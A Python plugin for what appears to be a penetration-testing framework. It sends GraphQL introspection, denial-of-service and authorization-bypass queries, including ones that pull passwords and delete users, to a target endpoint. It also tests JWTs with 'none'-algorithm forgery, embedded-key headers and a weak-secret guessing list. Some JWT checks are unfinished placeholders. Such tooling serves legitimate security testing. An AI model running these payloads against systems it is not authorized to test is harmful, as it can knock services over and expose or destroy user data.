import json
import base64
from typing import Dict, List, Any
from cybershell.plugins import PluginBase

class ProtocolSpecificPlugin(PluginBase):
    def __init__(self):
        super().__init__()
        self.name = "ProtocolSpecificPlugin"
        self.description = "Protocol-specific vulnerability testing (GraphQL, JWT, WebSocket, etc.)"
        
    def execute(self, context: Dict[str, Any]) -> Dict[str, Any]:
        protocol = context.get('protocol', '').lower()
        
        if protocol == 'graphql':
            return self._test_graphql(context)
        elif protocol == 'jwt':
            return self._test_jwt(context)
        elif protocol == 'websocket':
            return self._test_websocket(context)
        elif protocol == 'grpc':
            return self._test_grpc(context)
            
        return {'success': False, 'error': f'Unsupported protocol: {protocol}'}
    
    def _test_graphql(self, context: Dict) -> Dict[str, Any]:
        """GraphQL-specific vulnerability testing"""
        
        endpoint = context.get('endpoint', '')
        
        # GraphQL introspection query
        introspection_query = {
            "query": """
                query IntrospectionQuery {
                    __schema {
                        queryType { name }
                        mutationType { name }
                        subscriptionType { name }
                        types {
                            ...FullType
                        }
                    }
                }
                fragment FullType on __Type {
                    kind
                    name
                    description
                    fields(includeDeprecated: true) {
                        name
                        description
                        args {
                            ...InputValue
                        }
                        type {
                            ...TypeRef
                        }
                        isDeprecated
                        deprecationReason
                    }
                    inputFields {
                        ...InputValue
                    }
                    interfaces {
                        ...TypeRef
                    }
                    enumValues(includeDeprecated: true) {
                        name
                        description
                        isDeprecated
                        deprecationReason
                    }
                    possibleTypes {
                        ...TypeRef
                    }
                }
                fragment InputValue on __InputValue {
                    name
                    description
                    type { ...TypeRef }
                    defaultValue
                }
                fragment TypeRef on __Type {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                    ofType {
                                        kind
                                        name
                                        ofType {
                                            kind
                                            name
                                            ofType {
                                                kind
                                                name
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            """
        }
        
        # DoS queries
        dos_queries = [
            # Nested query attack
            {"query": "{ user { posts { comments { user { posts { comments { id } } } } } } }"},
            # Resource exhaustion
            {"query": "{ __schema { types { name fields { name } } } }"},
            # Alias-based DoS
            {"query": """
                {
                    a1: user(id: 1) { name }
                    a2: user(id: 1) { name }
                    a3: user(id: 1) { name }
                    # ... repeat many times
                }
            """}
        ]
        
        # Authorization bypass attempts
        auth_bypass_queries = [
            {"query": "{ users { id email password } }"},  # Try to access sensitive data
            {"query": "{ admin { secret } }"},  # Try to access admin-only data
            {"query": "mutation { deleteUser(id: 1) { success } }"}  # Try destructive operations
        ]
        
        vulnerabilities = []
        
        # Test each category
        test_results = {
            'introspection': self._test_graphql_queries(endpoint, [introspection_query]),
            'dos': self._test_graphql_queries(endpoint, dos_queries),
            'auth_bypass': self._test_graphql_queries(endpoint, auth_bypass_queries)
        }
        
        # Analyze results
        for test_type, results in test_results.items():
            if any(r.get('success') for r in results):
                vulnerabilities.append(test_type)
        
        return {
            'success': len(vulnerabilities) > 0,
            'vulnerabilities': vulnerabilities,
            'test_results': test_results,
            'evidence_score': 0.8 if vulnerabilities else 0.3
        }
    
    def _test_graphql_queries(self, endpoint: str, queries: List[Dict]) -> List[Dict]:
        """Test a list of GraphQL queries"""
        results = []
        
        for query in queries:
            try:
                import requests
                response = requests.post(
                    endpoint,
                    json=query,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )
                
                results.append({
                    'success': response.status_code == 200,
                    'status_code': response.status_code,
                    'response': response.text[:500],  # Truncated response
                    'query': query
                })
                
            except Exception as e:
                results.append({
                    'success': False,
                    'error': str(e),
                    'query': query
                })
        
        return results
    
    def _test_jwt(self, context: Dict) -> Dict[str, Any]:
        """JWT-specific vulnerability testing"""
        
        token = context.get('token', '')
        if not token:
            return {'success': False, 'error': 'No JWT token provided'}
        
        vulnerabilities = []
        
        # Algorithm confusion attacks
        alg_confusion_tests = [
            {'alg': 'none'},  # None algorithm
            {'alg': 'HS256'},  # Symmetric instead of asymmetric
            {'alg': 'NONE'},  # Case variation
            {'alg': 'NOnE'},  # Mixed case
        ]
        
        # Key confusion attacks
        key_confusion_tests = [
            # Embed public key in header
            {
                'alg': 'RS256',
                'jwk': {
                    'kty': 'RSA',
                    'e': 'AQAB',
                    'n': 'fake_modulus'
                }
            }
        ]
        
        # Weak secret attacks
        weak_secrets = ['secret', 'password', '123456', 'admin', 'jwt']
        
        # Test each vulnerability class
        if self._test_jwt_algorithm_confusion(token, alg_confusion_tests):
            vulnerabilities.append('algorithm_confusion')
            
        if self._test_jwt_key_confusion(token, key_confusion_tests):
            vulnerabilities.append('key_confusion')
            
        if self._test_jwt_weak_secret(token, weak_secrets):
            vulnerabilities.append('weak_secret')
        
        return {
            'success': len(vulnerabilities) > 0,
            'vulnerabilities': vulnerabilities,
            'evidence_score': 0.9 if vulnerabilities else 0.2
        }
    
    def _test_jwt_algorithm_confusion(self, token: str, tests: List[Dict]) -> bool:
        """Test JWT algorithm confusion attacks"""
        try:
            # Parse existing token
            header, payload, signature = token.split('.')
            
            # Decode payload
            decoded_payload = base64.urlsafe_b64decode(
                payload + '=' * (4 - len(payload) % 4)
            ).decode()
            
            for test_header in tests:
                # Create new token with modified algorithm
                new_header = base64.urlsafe_b64encode(
                    json.dumps(test_header).encode()
                ).decode().rstrip('=')
                
                new_token = f"{new_header}.{payload}."
                
                # Test token (would need actual endpoint)
                # This is a placeholder for the actual test
                pass
            
            return False  # Placeholder
            
        except Exception:
            return False
    
    def _test_jwt_key_confusion(self, token: str, tests: List[Dict]) -> bool:
        """Test JWT key confusion attacks"""
        # Implementation for key confusion testing
        return False
    
    def _test_jwt_weak_secret(self, token: str, secrets: List[str]) -> bool:
        """Test JWT with weak secrets"""
        import hmac
        import hashlib
        
        try:
            header, payload, signature = token.split('.')
            message = f"{header}.{payload}"
            
            for secret in secrets:
                # Try to verify with weak secret
                expected_signature = base64.urlsafe_b64encode(
                    hmac.new(
                        secret.encode(),
                        message.encode(),
                        hashlib.sha256
                    ).digest()
                ).decode().rstrip('=')
                
                if expected_signature == signature:
                    return True
                    
        except Exception:
            pass
            
        return False
